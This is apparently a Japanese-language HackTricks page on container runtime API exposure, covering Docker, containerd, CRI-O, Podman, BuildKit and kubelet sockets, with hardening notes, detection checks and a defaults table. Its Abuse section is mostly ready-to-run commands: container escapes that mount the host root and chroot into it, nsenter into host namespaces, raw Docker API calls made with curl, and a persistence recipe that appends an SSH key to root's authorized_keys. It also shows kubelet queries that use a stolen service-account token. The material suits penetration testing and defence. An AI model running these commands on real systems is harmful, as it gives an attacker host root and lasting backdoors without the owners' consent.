# Runtime API And Daemon Exposure

## 概要

実際の container compromise の多くは、namespace escape から始まるわけではありません。runtime control plane へのアクセスから始まります。workload が、マウントされた Unix socket や公開された TCP listener を介して `dockerd`、`containerd`、CRI-O、Podman、または kubelet と通信できる場合、攻撃者はより高い権限を持つ新しい container の作成、host filesystem の mount、host namespace への参加、または機密性の高い node 情報の取得を要求できる可能性があります。このような場合、runtime API が実際の security boundary であり、これを compromise することは、実質的に host を compromise することに近い状態です。

このため、runtime socket exposure は kernel protections とは別に記録すべきです。通常の seccomp、capabilities、MAC confinement が適用された container であっても、`/var/run/docker.sock` または `/run/containerd/containerd.sock` が内部に mount されていれば、host compromise まで API call 1 回で到達できる可能性があります。現在の container に対する kernel isolation は設計どおりに機能していても、runtime management plane は完全に exposed のままになり得ます。

## Daemon Access Models

Docker Engine は従来、特権 API をローカル Unix socket の `unix:///var/run/docker.sock` を通じて公開しています。過去には、`tcp://0.0.0.0:2375` のような TCP listener や、TLS で保護された `2376` の listener を通じてリモートに公開されることもありました。強力な TLS と client authentication なしで daemon をリモートに公開すると、Docker API は実質的にリモート root interface になります。

containerd、CRI-O、Podman、kubelet も、同様に high-impact な attack surface を公開しています。名称や workflow は異なりますが、logic は同じです。interface によって caller が workload を作成したり、host path を mount したり、credentials を取得したり、実行中の container を変更したりできる場合、その interface は privileged management channel であり、それに応じて扱う必要があります。

確認すべき一般的なローカル path は次のとおりです：
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
古い、またはより特殊な stack では、`dockershim.sock`、`frakti.sock`、`rktlet.sock` などの endpoint も公開されている場合があります。これらは modern な環境ではあまり一般的ではありませんが、見つかった場合は通常の application socket ではなく runtime-control surface を表すため、同じように注意して扱う必要があります。

## Secure Remote Access

daemon を local socket の範囲外に公開する必要がある場合、接続は TLS で保護し、できれば mutual authentication を使用して daemon が client を検証し、client が daemon を検証できるようにします。利便性のために Docker daemon を平文 HTTP で公開する古い習慣は、container administration における最も危険なミスの1つです。これは、API surface が privileged containers を直接作成できるほど強力だからです。

歴史的な Docker configuration pattern は次のようなものでした。
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd-based hosts では、daemon の通信が `fd://` として現れることもあります。これは、process が自分自身で直接 bind するのではなく、systemd から事前に open された socket を継承することを意味します。重要なのは正確な syntax ではなく、security 上の影響です。daemon が厳格に permission 管理された local socket の範囲を超えて listen した時点で、transport security と client authentication は optional な hardening ではなく、必須になります。

## Abuse

runtime socket が存在する場合は、どの socket なのか、compatible な client が存在するか、raw HTTP または gRPC access が可能かを確認します。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
これらのコマンドが有用なのは、存在しないパス、マウントされているがアクセスできない socket、そして稼働中の privileged API を区別できるためです。client が成功した場合、次に確認すべきなのは、その API で host bind mount または host namespace sharing を使用した新しい container を起動できるかどうかです。

### Client がインストールされていない場合

`docker`、`podman`、または別の使いやすい CLI が存在しないからといって、socket が安全とは限りません。Docker Engine は Unix socket 上で HTTP を使用し、Podman は `podman system service` を通じて Docker-compatible API と Libpod-native API の両方を公開します。つまり、`curl` しかない最小限の環境でも、daemon を操作するには十分な場合があります。
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
これは post-exploitation の際に重要です。defender が通常の client binaries を削除しても、management socket は mount されたままの場合があるためです。Podman hosts では、rootful と rootless の deployment で重要な path が異なることに注意してください。rootful service instances では `unix:///run/podman/podman.sock`、rootless では `unix://$XDG_RUNTIME_DIR/podman/podman.sock` です。

### Full Example: Docker Socket To Host Root

`docker.sock` に到達可能な場合、古典的な escape は host の root filesystem を mount した新しい container を起動し、その中で `chroot` することです：
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
これは Docker daemon を介してホストの root 権限で直接実行する手段を提供します。影響はファイルの読み取りに限定されません。新しい container 内に入ると、攻撃者はホスト上のファイルを変更し、credential を収集し、永続化を仕込み、追加の privileged workload を起動できます。

### 完全な例: Docker Socket からホストの Namespace へ

攻撃者が filesystem のみにアクセスする方法ではなく、namespace への entry を選ぶ場合:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
この経路では、現在の container を exploit するのではなく、runtime に明示的な host-namespace exposure を指定して新しい container を作成させることで host に到達します。

### Docker Socket Persistence Pattern

Runtime control は、one-shot shell の代わりに persistence にも使用できます。一般的なパターンは、host mount を持つ helper container を作成し、mount された host filesystem に authorized access material または startup hook を書き込み、その後 host がそれを利用することを検証するというものです。

具体例の形態:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
同じ考え方で、operator が何を証明したいかに応じて、systemd units、cron fragments、application startup files、または SSH keys を対象にできます。重要なのは、persistent change が元の container 内で追加の privilege を使って行われるのではなく、runtime daemon の host-level filesystem authority を介して行われる点です。

### Raw Docker API Helper Pivot

Docker CLI が存在しない場合でも、同じ host-mount helper flow を Unix socket 上の HTTP 経由で実行できます。一般的な flow は、API を確認し、host bind mount を持つ helper container を作成し、それを start し、exec instance を作成して、その exec を start するというものです。
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
最終的な `/exec/<id>/start` リクエストは返された exec ID に依存しますが、security point は正確な JSON plumbing とは無関係です。rootful Docker daemon への raw API access だけで、より強力な helper workload をリクエストするには十分です。

### 完全な例：containerd Socket

マウントされた `containerd` socket は、通常、同じくらい危険です。<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
より Docker に近い client が存在する場合、`--privileged`、`--pid=host`、`-v` などの使い慣れた flag を利用できるため、`nerdctl` は `ctr` より便利です：
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
影響はここでもホスト侵害です。Docker固有のtoolingが存在しない場合でも、別のruntime APIが同じ管理権限を提供している可能性があります。Kubernetesノードでは、`crictl`もCRI endpointと直接通信するため、偵察やコンテナ操作に十分な場合があります。

### BuildKit Socket

`buildkitd`は「単なるビルド backend」と考えられがちなため見落とされやすいものの、daemonは依然として特権付きのcontrol planeです。到達可能な`buildkitd.sock`があると、攻撃者は任意のbuild stepを実行し、workerの機能を調査し、侵害された環境のlocal contextを使用し、daemonが許可するよう設定されている場合には`network.host`や`security.insecure`などの危険なentitlementを要求できる可能性があります。

最初に行う有用な操作は次のとおりです。
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
daemon が build requests を受け付ける場合、insecure entitlements が利用可能かテストします：
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
影響の正確な範囲は daemon の設定に依存しますが、permissive な entitlements を持つ rootful BuildKit service は、無害な開発者向けの便利機能ではありません。特に CI runners や共有 build nodes では、別の高価値な管理用 attack surface として扱ってください。

### Kubelet API Over TCP

kubelet は container runtime ではありませんが、依然として node management plane の一部であり、同じ trust boundary の議論に含まれることがよくあります。kubelet secure port `10250` に workload から到達できる場合、または node credentials、kubeconfigs、proxy rights が露出している場合、attacker は Kubernetes API server の admission path に一切触れることなく、Pods を列挙したり、logs を取得したり、node-local containers で commands を実行したりできる可能性があります。

まずは低コストな discovery から始めます：
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
kubelet または API-server proxy 経路で `exec` が認可されている場合、WebSocket 対応クライアントによって、node 上の他のコンテナで code execution を実行できてしまいます。これが、`get` 権限のみを持つ `nodes/proxy` も、見た目以上に危険である理由です。このリクエストは、コマンドを実行する kubelet エンドポイントに到達できます。また、こうした kubelet との直接的なやり取りは、通常の Kubernetes audit logs には記録されません。<sup>[[2]](#references)</sup>

## Checks

これらのチェックの目的は、コンテナが trust boundary の外部に残されるべき management plane に到達できるかどうかを確認することです。
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
ここで注目すべき点：

- mount された runtime socket は、単なる information disclosure ではなく、通常は直接的な administrative primitive です。
- TLS なしで `2375` を listen している TCP listener は、remote compromise の状態として扱う必要があります。
- `DOCKER_HOST` などの環境変数から、その workload が host runtime と通信するよう意図的に設計されていることが分かる場合があります。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトではローカル Unix socket | `dockerd` はローカル socket を listen し、daemon は通常 rootful | `/var/run/docker.sock` の mount、`tcp://...:2375` の公開、`2376` における弱い TLS または TLS なし |
| Podman | デフォルトでは daemonless CLI | 通常のローカル利用では長時間稼働する privileged daemon は不要。ただし `podman system service` が有効な場合、API socket が公開されることがある | `podman.sock` の公開、service の広範な実行、rootful API の利用 |
| containerd | ローカルの privileged socket | Administrative API はローカル socket 経由で公開され、通常は上位の tooling が利用する | `containerd.sock` の mount、広範な `ctr` または `nerdctl` access、privileged namespace の公開 |
| CRI-O | ローカルの privileged socket | CRI endpoint は node-local の信頼された component 用 | `crio.sock` の mount、CRI endpoint の untrusted workload への公開 |
| Kubernetes kubelet | Node-local management API | Kubelet は Pods から広範囲に到達可能にすべきではありません。認証および認可の構成によっては、access により pod state、credentials、execution features が公開される可能性があります | kubelet socket または cert の mount、弱い kubelet auth、host networking と到達可能な kubelet endpoint の組み合わせ |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
